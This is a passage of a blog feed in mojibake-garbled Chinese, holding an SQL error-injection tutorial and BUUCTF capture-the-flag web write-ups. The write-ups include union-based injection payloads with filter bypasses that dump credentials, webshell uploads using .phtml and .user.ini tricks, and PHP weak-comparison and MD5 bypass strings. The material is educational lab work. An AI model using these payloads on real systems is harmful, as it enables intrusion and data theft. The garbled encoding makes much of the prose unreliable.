35]/titleã€€ã€€èŠ‚ç‚¹é›†ä¸­bookçš„priceå…ƒç´ å€¼å¤§äº35çš„titleèŠ‚ç‚¹é›†</span><br></pre></td></tr></table></figure></p><p>é€šé…ç¬¦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XPathè·¯å¾„ä¸­åŒæ ·æ”¯æŒé€šé…ç¬¦ï¼ˆ*ï¼Œ@*ï¼Œnode()ï¼Œ text()ï¼‰</span><br><span class="line">ä¾‹ï¼šã€€ã€€/bookstore/*</span><br><span class="line">//title[@*]</span><br></pre></td></tr></table></figure></p><p>è¿ç®—ç¬¦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|ã€€ã€€ä¸¤ä¸ªèŠ‚ç‚¹é›†çš„åˆå¹¶ã€€ã€€ä¾‹ï¼š/root/book[1] | /root/book[3]</span><br><span class="line">+ï¼Œ-ï¼Œ*ï¼Œdevï¼Œmod</span><br><span class="line">=ï¼Œ!=ï¼Œ&lt;ï¼Œ&gt;ï¼Œ&lt;=ï¼Œ&gt;=</span><br><span class="line">orï¼Œandã€€ã€€æˆ–å’Œä¸</span><br><span class="line">å¤šä¸ªå±æ€§æ¡ä»¶æŸ¥è¯¢ã€€ã€€ã€€ã€€ã€€ã€€//div[@align=&apos;center&apos; and @height=&apos;24&apos;]</span><br><span class="line">ä¸å­˜åœ¨classå±æ€§ã€€ã€€ ã€€ã€€ã€€ã€€//div[not(@class)]</span><br></pre></td></tr></table></figure></p><h3 id="æŠ¥é”™åˆ†æ-1"><a href="#æŠ¥é”™åˆ†æ-1" class="headerlink" title="æŠ¥é”™åˆ†æ"></a>æŠ¥é”™åˆ†æ</h3><p>æŠ¥é”™æ³¨å…¥é€šè¿‡æŠ¥é”™ä¿¡æ¯æ¥æŸ¥åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œé¦–å…ˆéœ€è¦æ„é€ çš„å°±æ˜¯æŠ¥é”™ã€‚</p><p>ä¾‹å¦‚ï¼šSELECT ExtractValue(â€˜<a><b><b></b></b></a>â€˜, â€˜/a/bâ€™); å°±æ˜¯å¯»æ‰¾å‰ä¸€æ®µxmlæ–‡æ¡£å†…å®¹ä¸­çš„aèŠ‚ç‚¹ä¸‹çš„bèŠ‚ç‚¹ï¼Œè¿™é‡Œå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å†…å®¹ã€‚</p><figure class="image-box">                <img src="./4.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>åˆ©ç”¨concat()å‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚</p><p>concat()å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULL/äºŒè¿›åˆ¶ ï¼Œåˆ™è¿”å›å€¼ä¸º NULL/äºŒè¿›åˆ¶ã€‚</p><figure class="image-box">                <img src="./5.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><h2 id="updatexmlæŠ¥é”™"><a href="#updatexmlæŠ¥é”™" class="headerlink" title="updatexmlæŠ¥é”™"></a>updatexmlæŠ¥é”™</h2><p>updatexml()è¿”å›æ›¿æ¢çš„XMLç‰‡æ®µ</p><h3 id="å‡½æ•°åŸç†-2"><a href="#å‡½æ•°åŸç†-2" class="headerlink" title="å‡½æ•°åŸç†"></a>å‡½æ•°åŸç†</h3><p>åŸºæœ¬è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></p><h4 id="updatexmlï¼ˆï¼‰"><a href="#updatexmlï¼ˆï¼‰" class="headerlink" title="updatexmlï¼ˆï¼‰"></a>updatexmlï¼ˆï¼‰</h4><p>UpdateXML(xml_target, xpath_expr, new_xml)</p><p>xml_target:ï¼š éœ€è¦æ“ä½œçš„xmlç‰‡æ®µ</p><p>xpath_exprï¼š éœ€è¦æ›´æ–°çš„xmlè·¯å¾„(Xpathæ ¼å¼)</p><p>new_xmlï¼š æ›´æ–°åçš„å†…å®¹</p><p>æ­¤å‡½æ•°ç”¨æ¥æ›´æ–°é€‰å®šXMLç‰‡æ®µçš„å†…å®¹ï¼Œå°†XMLæ ‡è®°çš„ç»™å®šç‰‡æ®µçš„å•ä¸ªéƒ¨åˆ†æ›¿æ¢ä¸º xml_target æ–°çš„XMLç‰‡æ®µ new_xml ï¼Œç„¶åè¿”å›æ›´æ”¹çš„XMLã€‚xml_targetæ›¿æ¢çš„éƒ¨åˆ† ä¸xpath_expr ç”¨æˆ·æä¾›çš„XPathè¡¨è¾¾å¼åŒ¹é…ã€‚</p><p>å¦‚æœæœªxpath_expræ‰¾åˆ°è¡¨è¾¾å¼åŒ¹é… ï¼Œæˆ–è€…æ‰¾åˆ°å¤šä¸ªåŒ¹é…é¡¹ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›åŸå§‹ xml_targetXMLç‰‡æ®µã€‚æ‰€æœ‰ä¸‰ä¸ªå‚æ•°éƒ½åº”è¯¥æ˜¯å­—ç¬¦ä¸²ã€‚</p><h3 id="æŠ¥é”™åˆ†æ-2"><a href="#æŠ¥é”™åˆ†æ-2" class="headerlink" title="æŠ¥é”™åˆ†æ"></a>æŠ¥é”™åˆ†æ</h3><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val1</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val2</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;//b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val3</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val4</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val5</span><br><span class="line">***********ç»“æœ**************</span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>å½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹<br><figure class="image-box">                <img src="./6.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å‰é˜µå­çœ‹æˆ‘ä»¥å‰çš„æ–‡ç« &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.damyahome.top/%E4%B8%80%E4%BA%9B
      
    
    </summary>
    
    
      <category term="webå­¦ä¹ " scheme="https://www.damyahome.github.io/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="sqlæ³¨å…¥" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF webç»ƒä¹ 3</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A03/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A03/</id>
    <published>2020-09-29T09:21:43.000Z</published>
    <updated>2020-09-29T09:33:58.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p><a href="http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn" target="_blank" rel="noopener">http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn</a></p><p>å•å¼•å·æŠ¥é”™å­˜åœ¨æ³¨å…¥</p><figure class="image-box">                <img src="./1.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>è”åˆæŸ¥è¯¢è¯­å¥è¢«è¿‡æ»¤,å°è¯•åŒé‡æ³¨å…¥</p><figure class="image-box">                <img src="./2.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>åŒé‡æ³¨å…¥æœ‰æ•ˆ,ç»§ç»­æŸ¥è¯¢</p><p>ç»æŸ¥è¯¢å¤§æ¦‚è¿‡æ»¤äº† union select where or from,å…¨éƒ½åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos;+uniunionon+seselectlect+1,2,3--+&amp;password=1</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,database(),3--+&amp;password=1  //geek</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=&apos;geek&apos;--+&amp;password=1  //b4bsql,geekuser</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&apos;b4bsql&apos;--+&amp;password=1  //id,username,password</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(passwoorrd),3+frfromom+b4bsql--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./3.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{0bdcc0e4-8b1a-4855-974f-55185878f5aa}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p><a href="http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn" target="_blank" rel="noopener">http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./4.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ç½‘é¡µåå«ä¸Šä¼ å¤´åƒ,ä¼°è®¡åç¼€åæ˜¯å›¾ç‰‡,ç›´æ¥ä¼ å›¾ç‰‡é©¬</p><p>è¿‡æ»¤äº†phpåç¼€,å¤§å°å†™,php345ç­‰,æ”¹æˆphtmlä¸Šä¼ æˆåŠŸ</p><figure class="image-box">                <img src="./5.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æ·»åŠ èœåˆ€,è·¯å¾„æ˜¯/upload/shell.phtml,åœ¨æ ¹ç›®å½•æ‹¿åˆ°flag</p><figure class="image-box">                <img src="./6.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{0daae0dc-b56e-468e-9efd-250e2667f1e5}</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><a href="http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn" target="_blank" rel="noopener">http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn</a></p><p>å°è¯•äº†å¥½å¤šèƒ½è¢«phpè§£æçš„åç¼€,éƒ½æç¤ºillegal suffix!</p><p>ç”¨å›¾ç‰‡åç¼€æ—¶æç¤º</p><figure class="image-box">                <img src="./7.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>çœ‹åˆ°æ•°ç»„è¾“å‡º,çŒœæµ‹æ˜¯nginx,è€ƒè™‘ä¸Šä¼ .user.iniæ–‡ä»¶,.user.iniä¼šå°†å›¾ç‰‡é©¬ä¸­çš„ä»£ç åŒ…å«åˆ°æ¯ä¸ªphpæ–‡ä»¶ä¸­,è°ƒç”¨æ—¶ç”¨auto_prepend_fileæ¥åŒ…å«æˆ‘ä»¬çš„shell.jpg</p><p>åœ¨.user.inié‡Œèƒ½è°ƒç”¨çš„å‚æ•°æœ‰auto_prepend_fileå’Œauto_append_file</p><p>ç›¸å½“äºæŒ‡å®šä¸€ä¸ªæ–‡ä»¶,è‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰,ç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°</p><p>ä½†auto_prepend_fileæ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥,è€Œauto_append_fileæ˜¯åœ¨æ–‡ä»¶æœ€åæ‰æ’å…¥</p><figure class="image-box">                <img src="./8.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æ³¨æ„è·¯å¾„,/uploads/04b0951938d905b41348c1548f9c338b/index.php</p><p>ä¸Šä¼ æˆåŠŸåèšå‰‘è¿æ¥</p><figure class="image-box">                <img src="./9.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{751bca8b-f279-435d-acdf-a0c711380fab}</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p><a href="http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn" target="_blank" rel="noopener">http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn</a></p><p>æ ¹æ® Try to find out source file! å…ˆæŸ¥çœ‹æºç </p><p>fuzzäº†ä¸€ä¸‹,æºç æ–‡ä»¶æ˜¯index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">Â  Â  $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">Â  Â  <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line"><span class="comment">//æ£€æµ‹$keyæ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  $key = intval($key);</span><br><span class="line"><span class="comment">//è·å–$keyçš„æ•´æ•°å€¼</span></span><br><span class="line">Â  Â  $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">Â  Â  <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line"><span class="comment">//è¦æ±‚$keyå–æ•´åçš„å€¼ç­‰äº$str</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> $flag;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨ $key == $str çš„æ¯”è¾ƒä¸­æ˜¯å¼±æ¯”è¾ƒ,åªéœ€æ¯”è¾ƒå­—æ¯å‰çš„æ•°å­—,å³<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./10.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{2d41b6bd-3496-40fc-b34c-32c91ca50b67}</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p><a href="http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn" target="_blank" rel="noopener">http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./11.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ä¼ ä¸ªå›¾ç‰‡é©¬,æ”¹åç¼€phtml,åŠ GIF98Aå¤´</p><figure class="image-box">                <img src="./12.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>èšå‰‘è¿æ¥,æ‹¿åˆ°æ ¹ç›®å½•ä¸‹flag</p><figure class="image-box">                <img src="./13.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{f6d3674b-ccd1-439c-9cd9-a51059d1b5a3}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p><a href="http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn" target="_blank" rel="noopener">http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./14.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æŸ¥çœ‹pay.phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>postä¸€ä¸ªpassword=404,æŠ“ä¸ªåŒ…<br><figure class="image-box">                <img src="./15.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><p>cookieé‡Œæœ‰å¯ç–‘å˜é‡,æ”¹user=1</p><figure class="image-box">                <img src="./16.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å› ä¸ºæ¯”è¾ƒè¿˜æ˜¯ == ,å¯ä»¥å¼±æ¯”è¾ƒç»•è¿‡</p><figure class="image-box">                <img src="./17.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>postä¸€ä¸ªå¤Ÿä¹°flagçš„money</p><figure class="image-box">                <img src="./18.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ç›´æ¥ä¹°ä¼šæç¤ºå­—ç¬¦ä¸²å¤ªé•¿,å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤º100000000=1e9</p><figure class="image-box">                <img src="./19.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{ce96bdde-166b-4b5e-84c5-1532f8498f23}</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><a href="http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn" target="_blank" rel="noopener">http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./20.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æŸ¥çœ‹æºç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"upload"</span> <span class="attr">action</span>=<span class="string">"leveldo4.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">class</span>=<span class="string">"in"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"give"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é¢˜å’Œmd5æœ‰å…³,åœ¨md5é‡Œæœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„å­—ç¬¦ä¸² ffifdyop<br>è¿™ä¸ªå­—ç¬¦ä¸²md5åæ˜¯â€™orâ€™6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b,æ­£å¥½å‰å‡ ä½å¯ä»¥ç”¨äºé—­åˆæŸ¥è¯¢è¯­å¥,å°±å¯ä»¥ç”¨æ¥ç»•è¿‡</p><figure class="image-box">                <img src="./21.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å¼•å…¥äº†ä¸€ä¸ªæ–°é¡µé¢,è®¿é—®ä¹‹</p><figure class="image-box">                <img src="./22.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æŸ¥çœ‹æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">// wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨0eç»•è¿‡md5å¼±æ¯”è¾ƒ,ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„0eå­—ç¬¦ä¸²<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">aabg7XSs</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./23.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a=QNKCDZO&amp;b=s878926199a</span><br><span class="line">ä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</span><br><span class="line">levels91.php?a[]=a&amp;b[]=b</span><br></pre></td></tr></table></figure><p>åˆåˆ°äº†æ–°é¡µé¢<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>Â <span class="string">"flag.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">Â Â Â Â <span 